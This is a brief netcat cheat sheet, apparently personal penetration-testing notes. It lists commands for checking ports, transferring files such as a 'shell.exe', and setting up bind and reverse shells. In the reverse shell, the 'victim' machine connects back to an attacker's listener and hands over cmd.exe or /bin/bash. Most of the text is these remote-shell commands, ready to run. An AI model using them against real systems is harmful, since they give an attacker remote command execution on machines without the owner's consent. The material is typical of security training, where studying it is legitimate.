Use for:
1. Check if a port is open or closed
2. Read a banner from the service listening on a port.
3. Connect to a network service manually.



check port

nc -nv <ip> <port>



transfer file

receive
nc -lvnp 4444 > incoming.exe

send

nc -nv <ip receive> 4444 < /tmp/shell.exe


bind shell

victim
nc -lvnp 443 -e cmd.exe
nc -lvnp 443 -e /bin/bash

attacker

nc -nv <ip victim> 443

reverse shell

attacker
nc -lvnp 443

victim
nc -nv <ip attacker> 443 -e cmd.exe
nc -nv <ip attacker> 443 -e /bin/bash


note:
-n -> disable DNS name resolution
-v -> verbose
-p -> port
-l -> listener
